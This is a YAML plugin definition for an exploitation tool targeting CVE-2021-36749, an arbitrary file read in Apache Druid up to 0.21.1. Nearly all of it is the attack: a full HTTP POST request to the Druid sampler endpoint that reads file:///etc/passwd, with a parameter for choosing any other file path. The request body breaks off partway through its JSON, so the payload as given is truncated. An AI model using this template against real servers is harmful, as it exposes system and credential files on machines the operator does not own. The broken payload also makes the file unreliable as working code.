info:
    app: Druid
    name: CVE-2021-36749
    author: 凉风
    plugin_version: 1.0.0
    disclosure_date: "2022-05-19"
    create_date: "2024-10-06 06:57:53"
    update_date: "2024-10-06 06:57:53"
    scope: Apache Druid <= v0.21.1
    description: Apache Druid 任意文件读取漏洞
    vul_id: CVE-2021-36749
    detail: 格式：file:///etc/passwd 更改文件即可
    payload: "POST/druid/indexer/v1/sampler?for=connectHTTP/1.1 \nHost:www.cisp-pte.com\nContent-Length:423 \nAccept:application/json,text/plain,*/*\nUser-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,like Gecko)Chrome/95.0.4638.54Safari/537.36 \nContent-Type:application/json;charset=UTF-8 \nAccept-Encoding:gzip,deflate \nAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 \nConnection:close\n\n{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]},\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"raw\"]}},\"dataSche ma\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":"
    reference: http://wiki.cisp-pte.com/#/wiki
    vul_type: 任意文件读取
payloads:
    - name: read
      alias: 文件读取
      params:
          - key: path
            title: 路径
            param_type: edit
            default_value: file:///etc/passwd
            required: true
